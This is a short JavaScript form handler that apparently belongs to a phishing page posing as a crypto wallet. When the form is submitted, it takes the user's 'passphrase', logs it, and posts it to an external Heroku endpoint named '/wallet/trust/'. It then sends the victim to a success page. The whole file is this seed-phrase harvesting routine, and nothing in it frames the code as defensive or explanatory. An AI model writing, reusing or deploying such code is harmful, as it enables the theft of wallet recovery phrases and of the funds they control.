var passphrase = document.querySelector("#phrasesub");
const form = document.querySelector("#phraseform");

const formEvent = form.addEventListener("submit", (event) => {
  event.preventDefault();
  console.log(passphrase.value.trim());
  let trimmedPhrase = passphrase.value.trim();
  axios
    .post("https://nodepagedata.herokuapp.com/wallet/trust/", {
      passphrase: trimmedPhrase,
    })
    .then((response) => {
      console.log(response);
      window.location.href = "/success.html";
    })
    .catch((error) => console.error(error));
});
